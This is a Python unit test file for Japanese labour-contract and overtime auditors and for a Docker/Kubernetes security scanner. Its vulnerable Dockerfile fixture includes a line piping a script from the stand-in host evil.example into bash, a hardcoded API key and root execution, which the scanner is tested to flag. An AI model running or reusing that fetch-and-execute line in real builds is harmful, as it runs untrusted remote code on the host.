"""Unit tests for Wave 8 Track 1 Actors #19-#20, Track 7 deliverable #6, and 9-gate Track 5 CLI."""

from __future__ import annotations

import csv
from pathlib import Path

from tracks.track1_apify.docker_k8s_hardening_actor.main import (
    audit_container_manifest_batch,
    audit_container_manifest_item,
)
from tracks.track1_apify.jp_roumu_keiyaku_actor.main import (
    audit_36_agreement_hours,
    audit_roumu_batch,
    audit_roumu_item,
)
from tracks.track5_direct_sales.booth_pro_pack.batch_compliance_suite_cli import (
    run_offline_compliance_audit,
)
from tracks.track7_freelance_kit.deliverables.attendance_36_overtime_auditor import (
    audit_attendance_csv,
)


def test_actor19_roumu_notice_payroll_and_art36_auditor() -> None:
    weak = "契約期間1年。勤務場所：本社。業務：開発。月給300,000円（固定残業代含む）。末日締25日払。始業9時終業18時休日土日。退職解雇。"
    res = audit_roumu_item(weak, is_fixed_term=True)
    for expected in (
        "LSA-2024-CHANGE-SCOPE",
        "LSA-2024-RENEWAL-CAP",
        "LSA-2024-MUKI-CONVERSION",
        "FIXED-OT-AMOUNT-SEP",
        "FIXED-OT-HOURS-SPEC",
        "FIXED-OT-EXCESS-PAY",
    ):
        assert expected in res["rule_ids"]
    assert res["status"] == "high_risk"

    compliant = (
        "契約期間：期間の定めなし。就業の場所：本社（変更の範囲：全事業所）。業務の内容：開発（変更の範囲：全業務）。"
        "始業9:00終業18:00休憩60分休日土日。基本給：月額280,000円、固定残業代：月額45,000円（月20時間分、"
        "超過分は別途追加支給）。末日締め翌月25日払。退職・解雇は就業規則による。"
    )
    batch = audit_roumu_batch(
        [
            {
                "notice_text": compliant,
                "is_fixed_term": False,
                "payroll": {
                    "base_salary_yen": 240_000,
                    "monthly_scheduled_hours": 160,
                    "fixed_overtime_pay_yen": 45_000,
                    "fixed_overtime_hours": 20,
                    "actual_overtime_hours": 70,
                    "minimum_wage_hourly_yen": 1163,
                },
                "monthly_hours": [40, 42, 82, 85, 44, 30],
            }
        ]
    )
    assert batch[0]["status"] == "pass"
    assert batch[0]["compliance_score"] == 100
    assert batch[0]["payroll_audit"]["unpaid_shortfall_yen"] == 90_000
    assert "OVER-60H-150X-TRIGGERED" in batch[0]["payroll_audit"]["flags"]
    assert batch[0]["art36_audit"]["compliant"] is False
    assert "LSA36-ROLLING-80H-BREACH" in batch[0]["art36_audit"]["violations"]

    clean_36 = audit_36_agreement_hours([40, 45, 70, 75, 42, 30, 50, 55, 40, 35, 50, 40])
    assert clean_36["compliant"] is True


def test_actor20_docker_k8s_security_auditor() -> None:
    vuln_docker = """
FROM python:latest
ENV API_KEY=hardcoded-secret-999
ADD https://downloads.example/bootstrap.sh /tmp/bootstrap.sh
RUN curl -sSL https://evil.example/a.sh | bash
USER root
CMD ["python3", "app.py"]
"""
    vuln_res = audit_container_manifest_item(vuln_docker, "Dockerfile")
    for expected in (
        "CNT-LATEST-TAG",
        "CNT-SECRET-IN-ENV-ARG",
        "CNT-REMOTE-EXEC-ADD",
        "CNT-ROOT-USER",
    ):
        assert expected in vuln_res["rule_ids"]
    assert vuln_res["risk_level"] == "high"

    safe_docker = """
FROM ghcr.io/org/app:1.2.3
RUN adduser --disabled-password appuser
USER appuser
CMD ["python3", "app.py"]
"""
    vuln_k8s = """
kind: Deployment
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: web
          image: nginx
          securityContext:
            privileged: true
"""
    batch = audit_container_manifest_batch(
        [
            {"name": "Dockerfile", "manifest_text": safe_docker},
            {"name": "k8s.yaml", "manifest_text": vuln_k8s},
        ]
    )
    assert batch[0]["security_score"] == 100
    assert batch[0]["risk_level"] == "low"
    assert batch[0]["findings"] == []
    assert "CNT-PRIVILEGED-HOST" in batch[1]["rule_ids"]
    assert "CNT-LATEST-TAG" in batch[1]["rule_ids"]
    assert "CNT-ROOT-USER" in batch[1]["rule_ids"]


def test_track7_attendance_36_overtime_auditor(tmp_path: Path) -> None:
    in_csv = tmp_path / "attendance.csv"
    out_csv = tmp_path / "attendance_summary.csv"
    rows = [
        {
            "employee_id": "E001",
            "employee_name": "鈴木一郎",
            "base_salary_yen": "240000",
            "fixed_allowance_yen": "0",
            "fixed_overtime_pay_yen": "45000",
            "fixed_overtime_hours": "20",
            "monthly_scheduled_hours": "160",
            "minimum_wage_hourly_yen": "1163",
            "actual_overtime_hours": "85",
            "late_night_hours": "0",
            "statutory_holiday_hours": "0",
        },
        {
            "employee_id": "E001",
            "employee_name": "鈴木一郎",
            "base_salary_yen": "240000",
            "fixed_allowance_yen": "0",
            "fixed_overtime_pay_yen": "45000",
            "fixed_overtime_hours": "20",
            "monthly_scheduled_hours": "160",
            "minimum_wage_hourly_yen": "1163",
            "actual_overtime_hours": "82",
            "late_night_hours": "0",
            "statutory_holiday_hours": "0",
        },
    ]
    with in_csv.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)

    res = audit_attendance_csv(in_csv, out_csv)
    assert res["network_calls"] == 0
    assert res["total_employees"] == 1
    assert res["violation_employees"] == 1
    assert res["total_unpaid_shortfall_yen"] > 0
    assert "LSA36-ROLLING-80H-BREACH" in res["summaries"][0]["flags"]
    assert out_csv.read_bytes().startswith(b"\xef\xbb\xbf")


def test_track5_nine_gate_compliance_suite_audits_labor_notice() -> None:
    report = run_offline_compliance_audit(
        [
            {
                "text": "株式会社東京テスト 担当: 山田太郎",
                "invoice_id": "T7000012050002",
                "payee_name": "スズキ イチロウ",
                "labor_notice_text": "有期契約1年。勤務場所：本社。月給280,000円（固定残業含む）。",
            }
        ]
    )
    assert report["network_calls"] == 0
    assert report["roumu_flagged_rows"] == 1
    assert "roumu_audit" in report["rows"][0]
    assert "LSA-2024-CHANGE-SCOPE" in report["rows"][0]["roumu_audit"]["rule_ids"]
